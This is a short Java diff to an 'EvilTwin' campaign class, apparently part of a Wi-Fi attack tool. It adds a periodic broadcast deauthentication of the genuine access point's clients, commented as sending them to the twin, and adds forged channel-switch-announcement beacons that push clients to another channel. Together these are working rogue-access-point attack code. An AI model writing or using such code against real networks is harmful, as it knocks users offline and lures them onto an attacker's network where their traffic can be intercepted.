@@ -112,8 +112,22 @@ public final class EvilTwin extends Campaign {
         }
 
         int rounds = Math.max(1, options.optInt("rounds", 600));
+        int csaChannel = options.optInt("csa_channel", 0);
+        boolean punt = options.optBoolean("punt", false);
+        if (csaChannel > 0 && csaChannel != channel) {
+            log(events, "announcing a move to channel " + csaChannel);
+        }
         for (int round = 1; round <= rounds && !shouldStop(); round++) {
-            chip.transmit(Frame.beacon(twin, ssid, channel, rsn, 100, privacy));
+            if (punt && round % 10 == 0) {
+                // Send the real AP's clients away; the twin answers when they look again.
+                chip.transmit(Frame.deauthAll(Mac.of(bssid), 7));
+            }
+            if (csaChannel > 0 && csaChannel != channel) {
+                chip.transmit(Frame.csaBeacon(twin, ssid, channel, rsn, 100, privacy,
+                        csaChannel, 3));
+            } else {
+                chip.transmit(Frame.beacon(twin, ssid, channel, rsn, 100, privacy));
+            }
             List<String> waiting;
             synchronized (probing) {
                 waiting = new ArrayList<>(probing);
